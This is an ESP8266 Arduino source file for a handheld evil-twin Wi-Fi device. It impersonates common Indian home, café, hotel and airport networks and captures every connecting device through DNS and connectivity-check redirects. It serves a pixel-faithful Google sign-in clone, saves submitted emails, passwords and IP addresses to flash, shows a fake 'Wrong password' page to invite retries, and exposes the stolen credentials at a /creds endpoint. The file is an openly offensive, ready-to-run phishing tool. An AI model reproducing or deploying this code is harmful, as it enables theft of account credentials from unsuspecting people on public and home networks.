/*
 * DARK — selectable-SSID captive portal with Google sign-in clone
 * ESP8266 | SSD1306 OLED | LittleFS
 */

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

#define SCREEN_W        128
#define SCREEN_H        64          // change to 32 for 0.91" panels
#define OLED_ADDR       0x3C
#define BTN             12          // D6, to GND
#define ROWS            ((SCREEN_H - 16) / 12)

Adafruit_SSD1306 oled(SCREEN_W, SCREEN_H, &Wire, -1);
ESP8266WebServer server(80);
DNSServer dnsServer;

const char* SSIDS[] = {
  "Airtel_2841",
  "Airtel_7735",
  "AIRTEL-4G_Home",
  "JioFiber_6B2A",
  "JioFiber_HOME",
  "JioFi_4G_9C31",
  "ACT_Fibernet",
  "Hathway_HOME",
  "Excitel_5512",
  "BSNL_BB_3310",
  "MTNL_Internet",
  "YouBroadband_2G",
  "TP-Link_4F2C",
  "D-Link_DIR615",
  "Netgear_HOME",
  "CafeCoffeeDay",
  "Starbucks_WiFi",
  "McDonalds_Free",
  "Barista_Guest",
  "Taj_Guest_WiFi",
  "OYO_WiFi",
  "DEL_Free_WiFi",
  "BOM_Airport_WiFi",
  "Home_WiFi",
  "Free_WiFi",
  "Guest_Network"
};
const int SSID_COUNT = sizeof(SSIDS) / sizeof(SSIDS[0]);

int  menuIndex   = 0;
bool inAttack    = false;
char activeSSID[33];
int  credCount   = 0;

/* ---------------- pages ---------------- */

const char CSS[] PROGMEM = R"CSS(
*{box-sizing:border-box}body{margin:0;font-family:Roboto,-apple-system,system-ui,sans-serif;
background:#fff;color:#202124;display:flex;flex-direction:column;min-height:100vh}
.wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:24px}
.card{width:100%;max-width:448px;border:1px solid #dadce0;border-radius:8px;padding:40px}
.logo{font-size:24px;font-weight:600;letter-spacing:-.5px;margin-bottom:16px}
.logo span:nth-child(1){color:#4285F4}.logo span:nth-child(2){color:#EA4335}
.logo span:nth-child(3){color:#FBBC05}.logo span:nth-child(4){color:#4285F4}
.logo span:nth-child(5){color:#34A853}.logo span:nth-child(6){color:#EA4335}
h1{font-size:24px;font-weight:400;margin:0 0 10px}
.sub{font-size:15px;margin:0 0 26px}
.email{font-size:14px;margin:-18px 0 22px;color:#202124}
.email b{font-weight:500}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;
outline:none;margin-bottom:8px}
input:focus{border:1px solid #1a73e8;box-shadow:0 0 0 1px #1a73e8}
.hint{font-size:14px;color:#202124;margin:0 0 26px}
.row{display:flex;align-items:center;justify-content:space-between;margin-top:26px}
.link{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none}
button{background:#1a73e8;color:#fff;border:0;border-radius:4px;padding:10px 24px;
font-size:14px;font-weight:500;cursor:pointer}
.foot{display:flex;justify-content:space-between;padding:14px 24px;font-size:12px;color:#5f6368}
.foot a{color:#5f6368;text-decoration:none;margin-left:18px}
)CSS";

const char PAGE_EMAIL[] PROGMEM = R"HTML(
<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in - Google Accounts</title><link rel="stylesheet" href="/s.css"></head>
<body><div class="wrap"><div class="card">
<div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
<h1>Sign in</h1><p class="sub">Use your Google Account</p>
<form method="POST" action="/email">
<input name="email" type="email" placeholder="Email or phone" required autofocus>
<p class="hint">Forgot email?</p>
<div class="row"><a class="link" href="/">Create account</a>
<button type="submit">Next</button></div>
</form></div></div>
<div class="foot"><span>English (India)</span>
<span><a href="/">Help</a><a href="/">Privacy</a><a href="/">Terms</a></span></div>
</body></html>
)HTML";

const char PAGE_PASS[] PROGMEM = R"HTML(
<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in - Google Accounts</title><link rel="stylesheet" href="/s.css"></head>
<body><div class="wrap"><div class="card">
<div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
<h1>Welcome</h1><p class="email"><b>EMAIL_PLACEHOLDER</b></p>
<form method="POST" action="/pass">
<input type="hidden" name="email" value="EMAIL_PLACEHOLDER">
<input name="pass" type="password" placeholder="Enter your password" required autofocus>
<div class="row"><a class="link" href="/">Forgot password?</a>
<button type="submit">Next</button></div>
</form></div></div>
<div class="foot"><span>English (India)</span>
<span><a href="/">Help</a><a href="/">Privacy</a><a href="/">Terms</a></span></div>
</body></html>
)HTML";

const char PAGE_FAIL[] PROGMEM = R"HTML(
<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in - Google Accounts</title><link rel="stylesheet" href="/s.css"></head>
<body><div class="wrap"><div class="card">
<div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
<h1>Wrong password</h1><p class="sub">Try again, or click "Forgot password" to recover it.</p>
<div class="row"><a class="link" href="/">Back</a>
<button onclick="location.href='/'">Retry</button></div>
</div></div></body></html>
)HTML";

/* ---------------- storage ---------------- */

void saveCred(const String& email, const String& pass) {
  File f = LittleFS.open("/creds.txt", "a");
  if (!f) return;
  f.printf("%lu|%s|%s|%s|%s\n",
           millis() / 1000, activeSSID, email.c_str(), pass.c_str(),
           server.client().remoteIP().toString().c_str());
  f.close();
  credCount++;
  Serial.printf("[+] %s : %s\n", email.c_str(), pass.c_str());
}

/* ---------------- handlers ---------------- */

void drawStatus();

void handleRoot()  { server.send_P(200, "text/html", PAGE_EMAIL); }
void handleCss()   { server.send_P(200, "text/css", CSS); }
void handle204()   { server.sendHeader("Location", "http://192.168.4.1/", true);
                     server.send(302, "text/plain", ""); }
void handleNcsi()  { server.send(200, "text/plain", "Microsoft NCSI"); }

void handleEmail() {
  String email = server.arg("email");
  String page = FPSTR(PAGE_PASS);
  page.replace("EMAIL_PLACEHOLDER", email);
  server.send(200, "text/html", page);
}

void handlePass() {
  saveCred(server.arg("email"), server.arg("pass"));
  server.send_P(200, "text/html", PAGE_FAIL);
  drawStatus();
}

void handleCreds() {
  File f = LittleFS.open("/creds.txt", "r");
  if (!f) { server.send(200, "text/plain", "empty"); return; }
  server.streamFile(f, "text/plain");
  f.close();
}

/* ---------------- OLED ---------------- */

void drawMenu() {
  oled.clearDisplay();
  oled.setTextSize(1);
  oled.setTextColor(SSD1306_WHITE);
  oled.setCursor(0, 0);
  oled.printf("SELECT TARGET (%d/%d)", menuIndex + 1, SSID_COUNT);
  oled.drawLine(0, 10, SCREEN_W, 10, SSD1306_WHITE);

  for (int r = 0; r < ROWS; r++) {
    int i = menuIndex + r - (ROWS / 2);
    if (i < 0 || i >= SSID_COUNT) continue;
    int y = 14 + r * 12;
    if (i == menuIndex) { oled.fillRect(0, y - 1, SCREEN_W, 12, SSD1306_WHITE);
                          oled.setTextColor(SSD1306_BLACK); }
    else oled.setTextColor(SSD1306_WHITE);
    oled.setCursor(3, y);
    oled.print(SSIDS[i]);
  }
  oled.display();
}

void drawStatus() {
  oled.clearDisplay();
  oled.setTextSize(1);
  oled.setTextColor(SSD1306_WHITE);
  oled.setCursor(0, 0);
  oled.print("AP: ");
  oled.println(activeSSID);
  oled.drawLine(0, 10, SCREEN_W, 10, SSD1306_WHITE);
  oled.setCursor(0, 16);
  oled.printf("Clients: %d\n", WiFi.softAPgetStationNum());
  oled.printf("Captured: %d\n", credCount);
  oled.setCursor(0, SCREEN_H - 10);
  oled.print("hold=menu");
  oled.display();
}

/* ---------------- attack start ---------------- */

void startAttack(int idx) {
  strncpy(activeSSID, SSIDS[idx], 32);
  activeSSID[32] = 0;

  WiFi.persistent(false);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(activeSSID, NULL, 6, 0, 4);

  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/",              handleRoot);
  server.on("/s.css",         handleCss);
  server.on("/email", HTTP_POST, handleEmail);
  server.on("/pass",  HTTP_POST, handlePass);
  server.on("/creds",         handleCreds);
  server.on("/generate_204",  handle204);
  server.on("/gen_204",       handle204);
  server.on("/hotspot-detect.html", handleRoot);
  server.on("/ncsi.txt",      handleNcsi);
  server.onNotFound(handleRoot);
  server.begin();

  inAttack = true;
  Serial.printf("\n[AP] up: %s\n", activeSSID);
  drawStatus();
}

void stopAttack() {
  server.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  inAttack = false;
  drawMenu();
}

/* ---------------- button ---------------- */

void scanButton() {
  static bool     down = false;
  static uint32_t tDown = 0;

  bool now = digitalRead(BTN) == LOW;

  if (now && !down) { down = true; tDown = millis(); }

  if (!now && down) {
    down = false;
    uint32_t held = millis() - tDown;

    if (held > 700) {
      if (inAttack) stopAttack();
      else          startAttack(menuIndex);
    } else {
      if (!inAttack) {
        menuIndex = (menuIndex + 1) % SSID_COUNT;
        drawMenu();
      }
    }
  }
}

/* ---------------- main ---------------- */

void setup() {
  Serial.begin(115200);
  pinMode(BTN, INPUT_PULLUP);
  LittleFS.begin();

  Wire.begin(4, 5);
  oled.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR);
  oled.clearDisplay();
  oled.display();

  drawMenu();
  Serial.println("\n[DARK] ready — short press scroll, long press select");
}

void loop() {
  scanButton();

  if (inAttack) {
    dnsServer.processNextRequest();
    server.handleClient();

    static uint32_t last = 0;
    if (millis() - last > 900) { last = millis(); drawStatus(); }
  }
  delay(5);
}
